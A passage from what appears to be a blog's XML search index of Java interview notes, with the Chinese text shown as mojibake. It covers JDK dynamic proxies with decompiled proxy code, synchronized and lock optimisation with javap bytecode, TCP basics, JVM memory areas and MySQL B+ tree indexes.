éœ€è¦è§£å†³è¿™ä¸ªé—®é¢˜å°±å¯ä»¥ç”¨åˆ° JDK çš„åŠ¨æ€ä»£ç†ã€‚ å…¶ä¸­æœ‰ä¸¤ä¸ªéå¸¸æ ¸å¿ƒçš„ç±»: java.lang.reflect.Proxyç±»ã€‚ java.lang.reflect.InvocationHandleæ¥å£ã€‚ Proxy ç±»æ˜¯ç”¨äºåˆ›å»ºä»£ç†å¯¹è±¡ï¼Œè€Œ InvocationHandler æ¥å£ä¸»è¦ä½ æ˜¯æ¥å¤„ç†æ‰§è¡Œé€»è¾‘ã€‚ å¦‚ä¸‹ï¼š1234567891011121314151617181920212223242526272829303132333435public class CustomizeHandle implements InvocationHandler &#123; private final static Logger LOGGER = LoggerFactory.getLogger(CustomizeHandle.class); private Object target; public CustomizeHandle(Class clazz) &#123; try &#123; this.target = clazz.newInstance(); &#125; catch (InstantiationException e) &#123; LOGGER.error("InstantiationException", e); &#125; catch (IllegalAccessException e) &#123; LOGGER.error("IllegalAccessException",e); &#125; &#125; @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; before(); Object result = method.invoke(target, args); after(); LOGGER.info("proxy class=&#123;&#125;", proxy.getClass()); return result; &#125; private void before() &#123; LOGGER.info("handle before"); &#125; private void after() &#123; LOGGER.info("handle after"); &#125;&#125; å…¶ä¸­æ„é€ æ–¹æ³•ä¼ å…¥è¢«ä»£ç†ç±»çš„ç±»ç±»å‹ã€‚å…¶å®ä¼ ä»£ç†ç±»çš„å®ä¾‹æˆ–è€…æ˜¯ç±»ç±»å‹å¹¶æ²¡æœ‰å¼ºåˆ¶çš„è§„å®šï¼Œä¼ ç±»ç±»å‹çš„æ˜¯å› ä¸ºè¢«ä»£ç†å¯¹è±¡åº”å½“æœ‰ä»£ç†åˆ›å»ºè€Œä¸åº”è¯¥ç”±è°ƒç”¨æ–¹åˆ›å»ºã€‚ ä½¿ç”¨æ–¹å¼å¦‚ä¸‹ï¼š123456@Testpublic void test()&#123; CustomizeHandle handle = new CustomizeHandle(ISubjectImpl.class) ; ISubject subject = (ISubject) Proxy.newProxyInstance(JDKProxyTest.class.getClassLoader(), new Class[]&#123;ISubject.class&#125;, handle); subject.execute() ;&#125; é¦–å…ˆä¼ å…¥è¢«ä»£ç†ç±»çš„ç±»ç±»å‹æ„å»ºä»£ç†å¤„ç†å™¨ã€‚æ¥ç€ä½¿ç”¨ Proxy çš„newProxyInstance æ–¹æ³•åŠ¨æ€åˆ›å»ºä»£ç†ç±»ã€‚ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºç±»åŠ è½½å™¨ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºä»£ç†ç±»éœ€è¦å®ç°çš„æ¥å£åˆ—è¡¨ï¼Œæœ€åä¸€ä¸ªåˆ™æ˜¯å¤„ç†å™¨ã€‚ å…¶å®ä»£ç†ç±»æ˜¯ç”± è¿™ä¸ªæ–¹æ³•åŠ¨æ€åˆ›å»ºå‡ºæ¥çš„ã€‚å°† proxyClassFile è¾“å‡ºåˆ°æ–‡ä»¶å¹¶è¿›è¡Œåç¼–è¯‘çš„è¯å°±å¯ä»¥çš„åˆ°ä»£ç†ç±»ã€‚1234567891011121314@Testpublic void clazzTest()&#123; byte[] proxyClassFile = ProxyGenerator.generateProxyClass( "$Proxy1", new Class[]&#123;ISubject.class&#125;, 1); try &#123; FileOutputStream out = new FileOutputStream("/Users/chenjie/Documents/$Proxy1.class") ; out.write(proxyClassFile); out.close(); &#125; catch (FileNotFoundException e) &#123; e.printStackTrace(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125;&#125; åç¼–è¯‘åç»“æœå¦‚ä¸‹:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869import com.crossoverjie.proxy.jdk.ISubject;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;import java.lang.reflect.UndeclaredThrowableException;public class $Proxy1 extends Proxy implements ISubject &#123; private static Method m1; private static Method m2; private static Method m3; private static Method m0; public $Proxy1(InvocationHandler var1) throws &#123; super(var1); &#125; public final boolean equals(Object var1) throws &#123; try &#123; return ((Boolean)super.h.invoke(this, m1, new Object[]&#123;var1&#125;)).booleanValue(); &#125; catch (RuntimeException | Error var3) &#123; throw var3; &#125; catch (Throwable var4) &#123; throw new UndeclaredThrowableException(var4); &#125; &#125; public final String toString() throws &#123; try &#123; return (String)super.h.invoke(this, m2, (Object[])null); &#125; catch (RuntimeException | Error var2) &#123; throw var2; &#125; catch (Throwable var3) &#123; throw new UndeclaredThrowableException(var3); &#125; &#125; public final void execute() throws &#123; try &#123; super.h.invoke(this, m3, (Object[])null); &#125; catch (RuntimeException | Error var2) &#123; throw var2; &#125; catch (Throwable var3) &#123; throw new UndeclaredThrowableException(var3); &#125; &#125; public final int hashCode() throws &#123; try &#123; return ((Integer)super.h.invoke(this, m0, (Object[])null)).intValue(); &#125; catch (RuntimeException | Error var2) &#123; throw var2; &#125; catch (Throwable var3) &#123; throw new UndeclaredThrowableException(var3); &#125; &#125; static &#123; try &#123; m1 = Class.forName("java.lang.Object").getMethod("equals", new Class[]&#123;Class.forName("java.lang.Object")&#125;); m2 = Class.forName("java.lang.Object").getMethod("toString", new Class[0]); m3 = Class.forName("com.crossoverjie.proxy.jdk.ISubject").getMethod("execute", new Class[0]); m0 = Class.forName("java.lang.Object").getMethod("hashCode", new Class[0]); &#125; catch (NoSuchMethodException var2) &#123; throw new NoSuchMethodError(var2.getMessage()); &#125; catch (ClassNotFoundException var3) &#123; throw new NoClassDefFoundError(var3.getMessage()); &#125; &#125;&#125; å¯ä»¥çœ‹åˆ°ä»£ç†ç±»ç»§æ‰¿äº† Proxy ç±»ï¼Œå¹¶å®ç°äº† ISubject æ¥å£ï¼Œç”±æ­¤ä¹Ÿå¯ä»¥çœ‹åˆ° JDK åŠ¨æ€ä»£ç†ä¸ºä»€ä¹ˆéœ€è¦å®ç°æ¥å£ï¼Œå·²ç»ç»§æ‰¿äº† Proxyæ˜¯ä¸èƒ½å†ç»§æ‰¿å…¶ä½™ç±»äº†ã€‚ å…¶ä¸­å®ç°äº† ISubject çš„ execute() æ–¹æ³•ï¼Œå¹¶é€šè¿‡ InvocationHandler ä¸­çš„ invoke() æ–¹æ³•æ¥è¿›è¡Œè°ƒç”¨çš„ã€‚ CGLIB åŠ¨æ€ä»£ç†cglib æ˜¯å¯¹ä¸€ä¸ªå°è€Œå¿«çš„å­—èŠ‚ç å¤„ç†æ¡†æ¶ ASM çš„å°è£…ã€‚ä»–çš„ç‰¹ç‚¹æ˜¯ç»§æ‰¿äºè¢«ä»£ç†ç±»ï¼Œè¿™å°±è¦æ±‚è¢«ä»£ç†ç±»ä¸èƒ½è¢« final ä¿®é¥°ã€‚]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Synchronize]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2FSynchronize%2F</url>
    <content type="text"><![CDATA[Synchronize å…³é”®å­—åŸç†ä¼—æ‰€å‘¨çŸ¥ Synchronize å…³é”®å­—æ˜¯è§£å†³å¹¶å‘é—®é¢˜å¸¸ç”¨è§£å†³æ–¹æ¡ˆï¼Œæœ‰ä»¥ä¸‹ä¸‰ç§ä½¿ç”¨æ–¹å¼: åŒæ­¥æ™®é€šæ–¹æ³•ï¼Œé”çš„æ˜¯å½“å‰å¯¹è±¡ã€‚ åŒæ­¥é™æ€æ–¹æ³•ï¼Œé”çš„æ˜¯å½“å‰ Class å¯¹è±¡ã€‚ åŒæ­¥å—ï¼Œé”çš„æ˜¯ {} ä¸­çš„å¯¹è±¡ã€‚ å®ç°åŸç†ï¼šJVM æ˜¯é€šè¿‡è¿›å…¥ã€é€€å‡ºå¯¹è±¡ç›‘è§†å™¨( Monitor )æ¥å®ç°å¯¹æ–¹æ³•ã€åŒæ­¥å—çš„åŒæ­¥çš„ã€‚ å…·ä½“å®ç°æ˜¯åœ¨ç¼–è¯‘ä¹‹ååœ¨åŒæ­¥æ–¹æ³•è°ƒç”¨å‰åŠ å…¥ä¸€ä¸ª monitor.enter æŒ‡ä»¤ï¼Œåœ¨é€€å‡ºæ–¹æ³•å’Œå¼‚å¸¸å¤„æ’å…¥ monitor.exit çš„æŒ‡ä»¤ã€‚ å…¶æœ¬è´¨å°±æ˜¯å¯¹ä¸€ä¸ªå¯¹è±¡ç›‘è§†å™¨( Monitor )è¿›è¡Œè·å–ï¼Œè€Œè¿™ä¸ªè·å–è¿‡ç¨‹å…·æœ‰æ’ä»–æ€§ä»è€Œè¾¾åˆ°äº†åŒä¸€æ—¶åˆ»åªèƒ½ä¸€ä¸ªçº¿ç¨‹è®¿é—®çš„ç›®çš„ã€‚ è€Œå¯¹äºæ²¡æœ‰è·å–åˆ°é”çš„çº¿ç¨‹å°†ä¼šé˜»å¡åˆ°æ–¹æ³•å…¥å£å¤„ï¼Œç›´åˆ°è·å–é”çš„çº¿ç¨‹ monitor.exit ä¹‹åæ‰èƒ½å°è¯•ç»§ç»­è·å–é”ã€‚ æµç¨‹å›¾å¦‚ä¸‹: é€šè¿‡ä¸€æ®µä»£ç æ¥æ¼”ç¤º: 12345public static void main(String[] args) &#123; synchronized (Synchronize.class)&#123; System.out.println("Synchronize"); &#125;&#125; ä½¿ç”¨ javap -c Synchronize å¯ä»¥æŸ¥çœ‹ç¼–è¯‘ä¹‹åçš„å…·ä½“ä¿¡æ¯ã€‚ 123456789101112131415161718192021222324252627282930public class com.crossoverjie.synchronize.Synchronize &#123; public com.crossoverjie.synchronize.Synchronize(); Code: 0: aload_0 1: invokespecial #1 // Method java/lang/Object.&quot;&lt;init&gt;&quot;:()V 4: return public static void main(java.lang.String[]); Code: 0: ldc #2 // class com/crossoverjie/synchronize/Synchronize 2: dup 3: astore_1 **4: monitorenter** 5: getstatic #3 // Field java/lang/System.out:Ljava/io/PrintStream; 8: ldc #4 // String Synchronize 10: invokevirtual #5 // Method java/io/PrintStream.println:(Ljava/lang/String;)V 13: aload_1 **14: monitorexit** 15: goto 23 18: astore_2 19: aload_1 20: monitorexit 21: aload_2 22: athrow 23: return Exception table: from to target type 5 15 18 any 18 21 18 any&#125; å¯ä»¥çœ‹åˆ°åœ¨åŒæ­¥å—çš„å…¥å£å’Œå‡ºå£åˆ†åˆ«æœ‰ monitorenter,monitorexitæŒ‡ä»¤ã€‚ é”ä¼˜åŒ–synchronize å¾ˆå¤šéƒ½ç§°ä¹‹ä¸ºé‡é‡é”ï¼ŒJDK1.6 ä¸­å¯¹ synchronize è¿›è¡Œäº†å„ç§ä¼˜åŒ–ï¼Œä¸ºäº†èƒ½å‡å°‘è·å–å’Œé‡Šæ”¾é”å¸¦æ¥çš„æ¶ˆè€—å¼•å…¥äº†åå‘é”å’Œè½»é‡é”ã€‚ è½»é‡é”å½“ä»£ç è¿›å…¥åŒæ­¥å—æ—¶ï¼Œå¦‚æœåŒæ­¥å¯¹è±¡ä¸ºæ— é”çŠ¶æ€æ—¶ï¼Œå½“å‰çº¿ç¨‹ä¼šåœ¨æ ˆå¸§ä¸­åˆ›å»ºä¸€ä¸ªé”è®°å½•(Lock Record)åŒºåŸŸï¼ŒåŒæ—¶å°†é”å¯¹è±¡çš„å¯¹è±¡å¤´ä¸­ Mark Word æ‹·è´åˆ°é”è®°å½•ä¸­ï¼Œå†å°è¯•ä½¿ç”¨ CAS å°† Mark Word æ›´æ–°ä¸ºæŒ‡å‘é”è®°å½•çš„æŒ‡é’ˆã€‚ å¦‚æœæ›´æ–°æˆåŠŸï¼Œå½“å‰çº¿ç¨‹å°±è·å¾—äº†é”ã€‚ å¦‚æœæ›´æ–°å¤±è´¥ JVM ä¼šå…ˆæ£€æŸ¥é”å¯¹è±¡çš„ Mark Word æ˜¯å¦æŒ‡å‘å½“å‰çº¿ç¨‹çš„é”è®°å½•ã€‚ å¦‚æœæ˜¯åˆ™è¯´æ˜å½“å‰çº¿ç¨‹æ‹¥æœ‰é”å¯¹è±¡çš„é”ï¼Œå¯ä»¥ç›´æ¥è¿›å…¥åŒæ­¥å—ã€‚ ä¸æ˜¯åˆ™è¯´æ˜æœ‰å…¶ä»–çº¿ç¨‹æŠ¢å äº†é”ï¼Œå¦‚æœå­˜åœ¨å¤šä¸ªçº¿ç¨‹åŒæ—¶ç«äº‰ä¸€æŠŠé”ï¼Œè½»é‡é”å°±ä¼šè†¨èƒ€ä¸ºé‡é‡é”ã€‚ è§£é”è½»é‡é”çš„è§£é”è¿‡ç¨‹ä¹Ÿæ˜¯åˆ©ç”¨ CAS æ¥å®ç°çš„ï¼Œä¼šå°è¯•é”è®°å½•æ›¿æ¢å›é”å¯¹è±¡çš„ Mark Word ã€‚å¦‚æœæ›¿æ¢æˆåŠŸåˆ™è¯´æ˜æ•´ä¸ªåŒæ­¥æ“ä½œå®Œæˆï¼Œå¤±è´¥åˆ™è¯´æ˜æœ‰å…¶ä»–çº¿ç¨‹å°è¯•è·å–é”ï¼Œè¿™æ—¶å°±ä¼šå”¤é†’è¢«æŒ‚èµ·çš„çº¿ç¨‹(æ­¤æ—¶å·²ç»è†¨èƒ€ä¸ºé‡é‡é”) è½»é‡é”èƒ½æå‡æ€§èƒ½çš„åŸå› æ˜¯ï¼š è®¤ä¸ºå¤§å¤šæ•°é”åœ¨æ•´ä¸ªåŒæ­¥å‘¨æœŸéƒ½ä¸å­˜åœ¨ç«äº‰ï¼Œæ‰€ä»¥ä½¿ç”¨ CAS æ¯”ä½¿ç”¨äº’æ–¥å¼€é”€æ›´å°‘ã€‚ä½†å¦‚æœé”ç«äº‰æ¿€çƒˆï¼Œè½»é‡é”å°±ä¸ä½†æœ‰äº’æ–¥çš„å¼€é”€ï¼Œè¿˜æœ‰ CAS çš„å¼€é”€ï¼Œç”šè‡³æ¯”é‡é‡é”æ›´æ…¢ã€‚ åå‘é”ä¸ºäº†è¿›ä¸€æ­¥çš„é™ä½è·å–é”çš„ä»£ä»·ï¼ŒJDK1.6 ä¹‹åè¿˜å¼•å…¥äº†åå‘é”ã€‚ åå‘é”çš„ç‰¹å¾æ˜¯:é”ä¸å­˜åœ¨å¤šçº¿ç¨‹ç«äº‰ï¼Œå¹¶ä¸”åº”ç”±ä¸€ä¸ªçº¿ç¨‹å¤šæ¬¡è·å¾—é”ã€‚ å½“çº¿ç¨‹è®¿é—®åŒæ­¥å—æ—¶ï¼Œä¼šä½¿ç”¨ CAS å°†çº¿ç¨‹ ID æ›´æ–°åˆ°é”å¯¹è±¡çš„ Mark Word ä¸­ï¼Œå¦‚æœæ›´æ–°æˆåŠŸåˆ™è·å¾—åå‘é”ï¼Œå¹¶ä¸”ä¹‹åæ¯æ¬¡è¿›å…¥è¿™ä¸ªå¯¹è±¡é”ç›¸å…³çš„åŒæ­¥å—æ—¶éƒ½ä¸éœ€è¦å†æ¬¡è·å–é”äº†ã€‚ é‡Šæ”¾é”å½“æœ‰å¦å¤–ä¸€ä¸ªçº¿ç¨‹è·å–è¿™ä¸ªé”æ—¶ï¼ŒæŒæœ‰åå‘é”çš„çº¿ç¨‹å°±ä¼šé‡Šæ”¾é”ï¼Œé‡Šæ”¾æ—¶ä¼šç­‰å¾…å…¨å±€å®‰å…¨ç‚¹(è¿™ä¸€æ—¶åˆ»æ²¡æœ‰å­—èŠ‚ç è¿è¡Œ)ï¼Œæ¥ç€ä¼šæš‚åœæ‹¥æœ‰åå‘é”çš„çº¿ç¨‹ï¼Œæ ¹æ®é”å¯¹è±¡ç›®å‰æ˜¯å¦è¢«é”æ¥åˆ¤å®šå°†å¯¹è±¡å¤´ä¸­çš„ Mark Word è®¾ç½®ä¸ºæ— é”æˆ–è€…æ˜¯è½»é‡é”çŠ¶æ€ã€‚ åå‘é”å¯ä»¥æé«˜å¸¦æœ‰åŒæ­¥å´æ²¡æœ‰ç«äº‰çš„ç¨‹åºæ€§èƒ½ï¼Œä½†å¦‚æœç¨‹åºä¸­å¤§å¤šæ•°é”éƒ½å­˜åœ¨ç«äº‰æ—¶ï¼Œé‚£åå‘é”å°±èµ·ä¸åˆ°å¤ªå¤§ä½œç”¨ã€‚å¯ä»¥ä½¿ç”¨ -XX:-userBiasedLocking=false æ¥å…³é—­åå‘é”ï¼Œå¹¶é»˜è®¤è¿›å…¥è½»é‡é”ã€‚ å…¶ä»–ä¼˜åŒ–é€‚åº”æ€§è‡ªæ—‹åœ¨ä½¿ç”¨ CAS æ—¶ï¼Œå¦‚æœæ“ä½œå¤±è´¥ï¼ŒCAS ä¼šè‡ªæ—‹å†æ¬¡å°è¯•ã€‚ç”±äºè‡ªæ—‹æ˜¯éœ€è¦æ¶ˆè€— CPU èµ„æºçš„ï¼Œæ‰€ä»¥å¦‚æœé•¿æœŸè‡ªæ—‹å°±ç™½ç™½æµªè´¹äº† CPUã€‚JDK1.6åŠ å…¥äº†é€‚åº”æ€§è‡ªæ—‹: å¦‚æœæŸä¸ªé”è‡ªæ—‹å¾ˆå°‘æˆåŠŸè·å¾—ï¼Œé‚£ä¹ˆä¸‹ä¸€æ¬¡å°±ä¼šå‡å°‘è‡ªæ—‹ã€‚]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[TCP-IP]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2FTCP-IP%2F</url>
    <content type="text"><![CDATA[TCP/IP åè®®TCP/IP æ€»ç»“èµ·æ¥å°±ä¸‰ä¸ªè¦ç‚¹ ä¸‰æ¬¡æ¡æ‰‹çš„æ„ä¹‰ã€‚ è¶…æ—¶é‡å‘ã€‚ æ»‘åŠ¨çª—å£ã€‚ ä¸‰æ¬¡æ¡æ‰‹ å¦‚å›¾ç±»ä¼¼ï¼š å‘é€è€…é—®æ¥æ”¶è€…æˆ‘å‘æ¶ˆæ¯äº†ï¼Œä½ æ”¶åˆ°äº†å˜›ï¼Ÿ æ¥æ”¶è€…å›å¤å‘é€è€…æˆ‘æ”¶åˆ°äº†ï¼Œä½ å‘æ¶ˆæ¯æ²¡é—®é¢˜ï¼Œæˆ‘æ”¶æ¶ˆæ¯ä¹Ÿæ²¡é—®é¢˜ã€‚ä½†æˆ‘ä¸çŸ¥é“æˆ‘çš„å‘æ¶ˆæ¯æœ‰æ²¡æœ‰é—®é¢˜ï¼Œä½ æ”¶åˆ°äº†å›å¤æˆ‘ä¸‹ã€‚ å‘é€è€…å‘Šè¯‰æ¥æ”¶è€…ï¼Œæˆ‘æ”¶åˆ°ä½ çš„æ¶ˆæ¯äº†ï¼Œä½ å‘æ¶ˆæ¯æ²¡é—®é¢˜ã€‚é€šä¿¡æˆåŠŸæˆ‘ä»¬å¼€å§‹å·¥ä½œå§ï¼ è¶…æ—¶é‡å‘å½“å‘é€è€…å‘æ¥æ”¶è€…å‘åŒ…åï¼Œå¦‚æœè¿‡äº†ä¸€æ®µæ—¶é—´(è¶…æ—¶æ—¶é—´)ä¾ç„¶æ²¡æœ‰æ”¶åˆ°æ¶ˆæ¯ï¼Œå°±å½“åšæœ¬æ¬¡åŒ…ä¸¢å¤±ï¼Œéœ€è¦é‡æ–°è¡¥å‘ã€‚ å¹¶ä¸”å¦‚æœä¸€æ¬¡æ€§å‘äº†ä¸‰ä¸ªåŒ…ï¼Œåªè¦æœ€åä¸€ä¸ªåŒ…ç¡®è®¤æ”¶åˆ°ä¹‹åå°±é»˜è®¤å‰é¢ä¸¤ä¸ªä¹Ÿæ”¶åˆ°äº†ã€‚ æ»‘åŠ¨çª—å£å‡è®¾ä¸€æ¬¡æ€§å‘é€åŒ…çš„å¤§å°ä¸º3ï¼Œé‚£ä¹ˆæ¯æ¬¡å¯ä»¥å‘3ä¸ªåŒ…ï¼Œè€Œä¸”å¯ä»¥è¾¹å‘è¾¹æ¥æ”¶ï¼Œè¿™æ ·å°±ä¼šå¢å¼ºæ•ˆç‡ã€‚è¿™é‡Œçš„ 3 å°±æ˜¯æ»‘åŠ¨çª—å£çš„å¤§å°ï¼Œè¿™æ ·çš„å‘é€æ–¹å¼ä¹Ÿå«æ»‘åŠ¨çª—å£åè®®ã€‚]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MemoryAllocation]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2FMemoryAllocation%2F</url>
    <content type="text"><![CDATA[Java è¿è¡Œæ—¶çš„å†…å­˜åˆ’åˆ† ç¨‹åºè®¡æ•°å™¨è®°å½•å½“å‰çº¿ç¨‹æ‰€æ‰§è¡Œçš„å­—èŠ‚ç è¡Œå·ï¼Œç”¨äºè·å–ä¸‹ä¸€æ¡æ‰§è¡Œçš„å­—èŠ‚ç ã€‚ å½“å¤šçº¿ç¨‹è¿è¡Œæ—¶ï¼Œæ¯ä¸ªçº¿ç¨‹åˆ‡æ¢åéœ€è¦çŸ¥é“ä¸Šä¸€æ¬¡æ‰€è¿è¡Œçš„çŠ¶æ€ã€ä½ç½®ã€‚ç”±æ­¤ä¹Ÿå¯ä»¥çœ‹å‡ºç¨‹åºè®¡æ•°å™¨æ˜¯æ¯ä¸ªçº¿ç¨‹ç§æœ‰çš„ã€‚ è™šæ‹Ÿæœºæ ˆè™šæ‹Ÿæœºæ ˆæ˜¯æœ‰ä¸€ä¸ªä¸€ä¸ªçš„æ ˆå¸§ç»„æˆï¼Œæ ˆå¸§æ˜¯åœ¨æ¯ä¸€ä¸ªæ–¹æ³•è°ƒç”¨æ—¶äº§ç”Ÿçš„ã€‚ æ¯ä¸€ä¸ªæ ˆå¸§ç”±å±€éƒ¨å˜é‡åŒºã€æ“ä½œæ•°æ ˆç­‰ç»„æˆã€‚æ¯åˆ›å»ºä¸€ä¸ªæ ˆå¸§å‹æ ˆï¼Œå½“ä¸€ä¸ªæ–¹æ³•æ‰§è¡Œå®Œæ¯•ä¹‹ååˆ™å‡ºæ ˆã€‚ å¦‚æœå‡ºç°æ–¹æ³•é€’å½’è°ƒç”¨å‡ºç°æ­»å¾ªç¯çš„è¯å°±ä¼šé€ æˆæ ˆå¸§è¿‡å¤šï¼Œæœ€ç»ˆä¼šæŠ›å‡º stackoverflow å¼‚å¸¸ã€‚ è¿™å—å†…å­˜åŒºåŸŸä¹Ÿæ˜¯çº¿ç¨‹ç§æœ‰çš„ã€‚ Java å †Java å †æ˜¯æ•´ä¸ªè™šæ‹Ÿæœºæ‰€ç®¡ç†çš„æœ€å¤§å†…å­˜åŒºåŸŸï¼Œæ‰€æœ‰çš„å¯¹è±¡åˆ›å»ºéƒ½æ˜¯åœ¨è¿™ä¸ªåŒºåŸŸè¿›è¡Œå†…å­˜åˆ†é…ã€‚ è¿™å—åŒºåŸŸä¹Ÿæ˜¯åƒåœ¾å›æ”¶å™¨é‡ç‚¹ç®¡ç†çš„åŒºåŸŸï¼Œç”±äºå¤§å¤šæ•°åƒåœ¾å›æ”¶å™¨éƒ½é‡‡ç”¨åˆ†ä»£å›æ”¶ç®—æ³•ï¼Œæ‰€æœ‰å †å†…å­˜ä¹Ÿåˆ†ä¸º æ–°ç”Ÿä»£ã€è€å¹´ä»£ï¼Œå¯ä»¥æ–¹ä¾¿åƒåœ¾çš„å‡†ç¡®å›æ”¶ã€‚ è¿™å—å†…å­˜å±äºçº¿ç¨‹å…±äº«åŒºåŸŸã€‚ æ–¹æ³•åŒºæ–¹æ³•åŒºä¸»è¦ç”¨äºå­˜æ”¾å·²ç»è¢«è™šæ‹ŸæœºåŠ è½½çš„ç±»ä¿¡æ¯ï¼Œå¦‚å¸¸é‡ï¼Œé™æ€å˜é‡ã€‚è¿™å—åŒºåŸŸä¹Ÿè¢«ç§°ä¸ºæ°¸ä¹…ä»£ã€‚ è¿è¡Œæ—¶å¸¸é‡æ± è¿è¡Œæ—¶å¸¸é‡æ± æ˜¯æ–¹æ³•åŒºçš„ä¸€éƒ¨åˆ†ï¼Œå…¶ä¸­å­˜æ”¾äº†ä¸€äº›ç¬¦å·å¼•ç”¨ã€‚å½“ new ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œä¼šæ£€æŸ¥è¿™ä¸ªåŒºåŸŸæ˜¯å¦æœ‰è¿™ä¸ªç¬¦å·çš„å¼•ç”¨ã€‚]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL-Index]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2FMySQL-Index%2F</url>
    <content type="text"><![CDATA[MySQL ç´¢å¼•åŸç†ç°åœ¨äº’è”ç½‘åº”ç”¨ä¸­å¯¹æ•°æ®åº“çš„ä½¿ç”¨å¤šæ•°éƒ½æ˜¯è¯»è¾ƒå¤šï¼Œæ¯”ä¾‹å¯ä»¥è¾¾åˆ° 10:1ã€‚å¹¶ä¸”æ•°æ®åº“åœ¨åšæŸ¥è¯¢æ—¶ IO æ¶ˆè€—è¾ƒå¤§ï¼Œæ‰€ä»¥å¦‚æœèƒ½æŠŠä¸€æ¬¡æŸ¥è¯¢çš„ IO æ¬¡æ•°æ§åˆ¶åœ¨å¸¸é‡çº§é‚£å¯¹æ•°æ®åº“çš„æ€§èƒ½æå‡å°†æ˜¯éå¸¸æ˜æ˜¾çš„ï¼Œå› æ­¤åŸºäº B+ Tree çš„ç´¢å¼•ç»“æ„å‡ºç°äº†ã€‚ B+ Tree çš„æ•°æ®ç»“æ„ å¦‚å›¾æ‰€ç¤ºæ˜¯ B+ Tree çš„æ•°æ®ç»“æ„ã€‚æ˜¯ç”±ä¸€ä¸ªä¸€ä¸ªçš„ç£ç›˜å—ç»„æˆçš„æ ‘å½¢ç»“æ„ï¼Œæ¯ä¸ªç£ç›˜å—ç”±æ•°æ®é¡¹å’ŒæŒ‡é’ˆç»„æˆã€‚ æ‰€æœ‰çš„æ•°æ®éƒ½æ˜¯å­˜æ”¾åœ¨å¶å­èŠ‚ç‚¹ï¼Œéå¶å­èŠ‚ç‚¹ä¸å­˜æ”¾æ•°æ®ã€‚ æŸ¥æ‰¾è¿‡ç¨‹ä»¥ç£ç›˜å—1ä¸ºä¾‹ï¼ŒæŒ‡é’ˆ P1 è¡¨ç¤ºå°äº17çš„ç£ç›˜å—ï¼ŒP2 è¡¨ç¤ºåœ¨ 17~35 ä¹‹é—´çš„ç£ç›˜å—ï¼ŒP3 åˆ™è¡¨ç¤ºå¤§äº35çš„ç£ç›˜å—ã€‚ æ¯”å¦‚è¦æŸ¥æ‰¾æ•°æ®é¡¹99ï¼Œé¦–å…ˆå°†ç£ç›˜å—1 load åˆ°å†…å­˜ä¸­ï¼Œå‘ç”Ÿ 1 æ¬¡ IOã€‚æ¥ç€é€šè¿‡äºŒåˆ†æŸ¥æ‰¾å‘ç° 99 å¤§äº 35ï¼Œæ‰€ä»¥æ‰¾åˆ°äº† P3 æŒ‡é’ˆã€‚é€šè¿‡P3 æŒ‡é’ˆå‘ç”Ÿç¬¬äºŒæ¬¡ IO å°†ç£ç›˜å—4åŠ è½½åˆ°å†…å­˜ã€‚å†é€šè¿‡äºŒåˆ†æŸ¥æ‰¾å‘ç°å¤§äº87ï¼Œé€šè¿‡ P3 æŒ‡é’ˆå‘ç”Ÿäº†ç¬¬ä¸‰æ¬¡ IO å°†ç£ç›˜å—11 åŠ è½½åˆ°å†…å­˜ã€‚æœ€åå†é€šè¿‡ä¸€æ¬¡äºŒåˆ†æŸ¥æ‰¾æ‰¾åˆ°äº†æ•°æ®é¡¹99ã€‚ ç”±æ­¤å¯è§ï¼Œå¦‚æœä¸€ä¸ªå‡ ç™¾ä¸‡çš„æ•°æ®æŸ¥è¯¢åªéœ€è¦è¿›è¡Œä¸‰æ¬¡ IO å³å¯æ‰¾åˆ°æ•°æ®ï¼Œé‚£ä¹ˆæ•´ä¸ªæ•ˆç‡å°†æ˜¯éå¸¸é«˜çš„ã€‚ è§‚å¯Ÿæ ‘çš„ç»“æ„ï¼Œå‘ç°æŸ¥è¯¢éœ€è¦ç»å†å‡ æ¬¡ IO æ˜¯ç”±æ ‘çš„é«˜åº¦æ¥å†³å®šçš„ï¼Œè€Œæ ‘çš„é«˜åº¦åˆç”±ç£ç›˜å—ï¼Œæ•°æ®é¡¹çš„å¤§å°å†³å®šçš„ã€‚ ç£ç›˜å—è¶Šå¤§ï¼Œæ•°æ®é¡¹è¶Šå°é‚£ä¹ˆæ•°çš„é«˜åº¦å°±è¶Šä½ã€‚è¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆç´¢å¼•å­—æ®µè¦å°½å¯èƒ½å°çš„åŸå› ã€‚ ç´¢å¼•ä½¿ç”¨çš„ä¸€äº›åŸåˆ™ã€‚]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OOM-analysis]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2FOOM-analysis%2F</url>
